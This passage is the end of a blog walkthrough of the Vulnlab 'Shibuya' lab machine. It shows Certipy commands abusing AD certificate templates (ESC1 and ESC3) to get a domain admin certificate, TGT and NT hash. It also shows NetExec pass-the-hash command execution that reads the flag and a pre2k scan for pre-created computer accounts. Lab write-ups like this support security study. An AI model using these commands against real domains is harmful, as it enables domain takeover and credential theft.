<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy req -u Nigel.Mills -p &lt;REDACTED&gt; -dc-ip 10.10.106.81 -target shibuya.vl -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin -sid S-1-5-21-87560095-894484815-3652015022-500 -key-size 4096</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 6</span><br><span class="line">[*] Got certificate with UPN &#x27;_admin&#x27;</span><br><span class="line">[*] Certificate object SID is &#x27;S-1-5-21-87560095-894484815-3652015022-500&#x27;</span><br><span class="line">[*] Saved certificate and private key to &#x27;_admin.pfx&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ certipy auth -pfx _admin.pfx -domain shibuya.vl -username _admin -dc-ip 10.10.106.81</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: _admin@shibuya.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;_admin.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;_admin&#x27;</span><br><span class="line">[*] Got hash for &#x27;_admin@shibuya.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>With the DA hash in hand, we can perform a DCSync, but I’ll just read the flag via SMB</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.106.81 -u _admin -H &lt;REDACTED&gt; -x &#x27;type C:\users\administrator\desktop\root.txt&#x27;</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [+] shibuya.vl\_admin:&lt;REDACTED&gt; (Pwn3d!)</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      [+] Executed command via wmiexec</span><br><span class="line">SMB         10.10.106.81    445    AWSJPDC0522      VL&#123;REDACTED&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Beyond-root"><a href="#Beyond-root" class="headerlink" title="Beyond root"></a>Beyond root</h1><h2 id="Pre-Created-Computer-Accounts"><a href="#Pre-Created-Computer-Accounts" class="headerlink" title="Pre-Created Computer Accounts"></a>Pre-Created Computer Accounts</h2><p>The <code>red:red</code> and <code>purple:purple</code> worked because both are precreated machine accounts. We can verify by running the <code>pre2k</code> module in NetExec</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q nxc ldap shibuya.vl -u red -p red -k -M pre2k</span><br><span class="line">LDAP        shibuya.vl      389    AWSJPDC0522      [*] Windows Server 2022 Build 20348 (name:AWSJPDC0522) (domain:shibuya.vl)</span><br><span class="line">LDAP        shibuya.vl      389    AWSJPDC0522      [+] shibuya.vl\red:red</span><br><span class="line">PRE2K       shibuya.vl      389    AWSJPDC0522      Pre-created computer account: RED$</span><br><span class="line">PRE2K       shibuya.vl      389    AWSJPDC0522      Pre-created computer account: PURPLE$</span><br><span class="line">PRE2K       shibuya.vl      389    AWSJPDC0522      [+] Found 2 pre-created computer accounts. Saved to /home/serio/.nxc/modules/pre2k/shibuya.vl/precreated_computers.txt</span><br><span class="line">PRE2K       shibuya.vl      389    AWSJPDC0522      [+] Successfully obtained TGT for red@shibuya.vl</span><br><span class="line">PRE2K       shibuya.vl      389    AWSJPDC0522      [+] Successfully obtained TGT for purple@shibuya.vl</span><br><span class="line">PRE2K       shibuya.vl      389    AWSJPDC0522      [+] Successfully obtained TGT for 2 pre-created computer accounts. Saved to /home/serio/.nxc/modules/pre2k/ccache</span><br></pre></td></tr></table></figure>
<h2 id="Exploiting-ESC3"><a href="#Exploiting-ESC3" class="headerlink" title="Exploiting ESC3"></a>Exploiting ESC3</h2><p>I don’t think I covered how to exploit ESC3 in my blog, so this is a great opportunity to demonstrate it</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy req -u Nigel.Mills -p &lt;REDACTED&gt; -target-ip 10.10.106.81 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -key-size 4096</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 11</span><br><span class="line">[*] Got certificate without identification</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;nigel.mills.pfx&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy req -u Nigel.Mills -p &lt;REDACTED&gt; -ca shibuya-AWSJPDC0522-CA -target-ip 10.10.106.81 -template User -on-behalf-of _admin -pfx nigel.mills.pfx -key-size 4096</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 13</span><br><span class="line">[*] Got certificate with UPN &#x27;_admin@shibuya.vl&#x27;</span><br><span class="line">[*] Certificate object SID is &#x27;S-1-5-21-87560095-894484815-3652015022-500&#x27;</span><br><span class="line">[*] Saved certificate and private key to &#x27;_admin.pfx&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 -q certipy auth -pfx _admin.pfx -domain shibuya.vl -username _admin -dc-ip 10.10.106.81</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: _admin@shibuya.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;_admin.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;_admin&#x27;</span><br><span class="line">[*] Got hash for &#x27;_admin@shibuya.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:&lt;REDACTED&gt;</span><br></pre></td></tr></table></figure>
<p>That concludes this machine. I hope you learned something new! 🐱</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
<li><a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/272327/cannot-qwinsta-during-winrm-but-it-works-when-run-under-newcredentials-logo">https://security.stackexchange.com/questions/272327/cannot-qwinsta-during-winrm-but-it-works-when-run-under-newcredentials-logo</a></li>
<li><a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2024/03/30/htb-rebound.html#cross-session-relay">https://0xdf.gitlab.io/2024/03/30/htb-rebound.html#cross-session-relay</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/antonioCoco/RemotePotato0">https://github.com/antonioCoco/RemotePotato0</a></li>
<li><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16">https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16</a></li>
<li><a target="_blank" rel="noopener" href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">https://trustedsec.com/blog/diving-into-pre-created-computer-accounts</a></li>
</ul>
</article><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/02/15/HTB-Solving-Cicada-Using-Only-NetExec/" title="HTB: Solving Cicada Using Only NetExec"><img class="cover" src="https://serioton.notion.site/image/attachment%3A4ca01f6b-9b7d-4591-bbdf-0bf2c18f6653%3Acicada.jpg?table=block&amp;id=19bd3b99-8509-8026-a179-e0118017a611&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">HTB: Solving Cicada Using Only NetExec</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/cat.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">serioton</div><div class="author-info__description">cat</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://twitter.com/seriotonctf"><i class="fab fa-twitter"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/seriotonctf" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://twitter.com/seriotonctf" target="_blank" title="Twitter"><i class="fab fa-twitter"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#User"><span class="toc-text">User</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB"><span class="toc-text">SMB</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ROOT"><span class="toc-text">ROOT</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Cross-Session-Relay"><span class="toc-text">Cross Session Relay</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ADCS"><span class="toc-text">ADCS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC1"><span class="toc-text">ESC1</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Beyond-root"><span class="toc-text">Beyond root</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pre-Created-Computer-Accounts"><span class="toc-text">Pre-Created Computer Accounts</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploiting-ESC3"><span class="toc-text">Exploiting ESC3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-text">Resources</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/04/07/Shibuya-Vulnlab/" title="Shibuya - Vulnlab"><img src="https://assets.vulnlab.com/shibuya_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shibuya - Vulnlab"/></a><div class="content"><a class="title" href="/2025/04/07/Shibuya-Vulnlab/" title="Shibuya - Vulnlab">Shibuya - Vulnlab</a><time datetime="2025-04-07T22:25:48.000Z" title="Created 2025-04-07 22:25:48">2025-04-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/02/15/HTB-Solving-Cicada-Using-Only-NetExec/" title="HTB: Solving Cicada Using Only NetExec"><img src="https://serioton.notion.site/image/attachment%3A4ca01f6b-9b7d-4591-bbdf-0bf2c18f6653%3Acicada.jpg?table=block&amp;id=19bd3b99-8509-8026-a179-e0118017a611&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB: Solving Cicada Using Only NetExec"/></a><div class="content"><a class="title" href="/2025/02/15/HTB-Solving-Cicada-Using-Only-NetExec/" title="HTB: Solving Cicada Using Only NetExec">HTB: Solving Cicada Using Only NetExec</a><time datetime="2025-02-15T13:54:52.000Z" title="Created 2025-02-15 13:54:52">2025-02-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/01/31/Abusing-Unconstrained-Delegation/" title="Abusing Unconstrained Delegation"><img src="https://serioton.notion.site/image/attachment%3A0bf0667e-6ae0-45c4-8872-2e681305a82c%3Acat.png?table=block&amp;id=18cd3b99-8509-805b-8ac7-f5241d4b2083&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=1420&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Abusing Unconstrained Delegation"/></a><div class="content"><a class="title" href="/2025/01/31/Abusing-Unconstrained-Delegation/" title="Abusing Unconstrained Delegation">Abusing Unconstrained Delegation</a><time datetime="2025-01-31T17:58:46.000Z" title="Created 2025-01-31 17:58:46">2025-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet"><img src="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2Febc8dc6e-40a9-492f-839f-b175138faa93%2Fcat.png?table=block&amp;id=14fd3b99-8509-80fd-bbe8-daf204d95fcc&amp;spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&amp;width=2000&amp;userId=&amp;cache=v2" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BloodyAD Cheatsheet"/></a><div class="content"><a class="title" href="/2024/12/01/BloodyAD-Cheatsheet/" title="BloodyAD Cheatsheet">BloodyAD Cheatsheet</a><time datetime="2024-12-01T20:16:14.000Z" title="Created 2024-12-01 20:16:14">2024-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/11/24/Redelegate-Vulnlab/" title="Redelegate - Vulnlab"><img src="https://assets.vulnlab.com/redelegate_slide.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Redelegate - Vulnlab"/></a><div class="content"><a class="title" href="/2024/11/24/Redelegate-Vulnlab/" title="Redelegate - Vulnlab">Redelegate - Vulnlab</a><time datetime="2024-11-24T16:47:11.000Z" title="Created 2024-11-24 16:47:11">2024-11-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/camille-sule-bg-loulou-frames-00.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By serioton</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">ฅ^•ﻌ•^ฅ</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div></div></body></html>